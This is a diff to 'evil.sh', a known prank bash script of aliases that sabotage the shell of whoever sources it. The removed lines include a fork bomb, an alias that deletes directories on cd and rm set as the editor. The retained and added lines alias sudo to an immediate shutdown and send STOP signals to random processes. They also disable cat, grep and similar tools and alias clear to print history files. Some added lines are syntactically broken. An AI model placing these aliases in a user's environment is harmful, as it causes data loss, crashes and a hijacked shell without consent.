@@ -1,8 +1,8 @@
 #!/usr/bin/env bash
 # evil.sh — https://mths.be/evil.sh
 
-# Set `rm` as the default editor.
-export EDITOR=/bin/rm;
+# Set
+export EDITOR=echo "nope";
 
 # Make Tab send the delete key.
 tset -Qe $'\t';
@@ -12,18 +12,23 @@ tset -Qe $'\t';
 
 # Let `cat` swallow every input and never return anything.
 alias cat=true;
+#Same for `less`, `grep`, `tail` and `cut`
+alias less=true;
+alias grep=true;
+alias tail=true;
+alias cut=true;
 
 # Use a random sort option whenever `ls` is invoked.
 function ls { command ls -$(opts="frStu"; echo ${opts:$((RANDOM % ${#opts})):1}) "$@"; }
 
-# Delete directories instead of entering them.
-alias cd='rm -rfv';
+#
+alias cd='cd /';
 
 # Shut down the computer instead of running a command with super-user rights.
 alias sudo='sudo shutdown -P now';
 
-# Launch a fork bomb instead of clearing the screen.
-alias clear=':(){ :|:& };:';
+# List all previous commands instead
+alias clear='cut -d';' -f 2 ~/.*_history';
 
 # Have `date` return random dates.
 alias date='date -d "now + $RANDOM days"';
@@ -59,8 +64,11 @@ fi;
 # Send STOP signal to random process at random time.
 sleep $[ ( $RANDOM % 100 )	+ 1 ]s && kill -STOP $(ps x -o pid|sed 1d|sort -R|head -1) &
 
-# Have `cp` perform `mv` instead.
-alias cp='mv';
+# Have `cp` perform `ls` instead.
+alias cp='ls';
+
+#Make `mv` show his contribution
+alias mv=echo "I don't want to do it";
 
 # Make `exit` open a new shell.
 alias exit='sh';
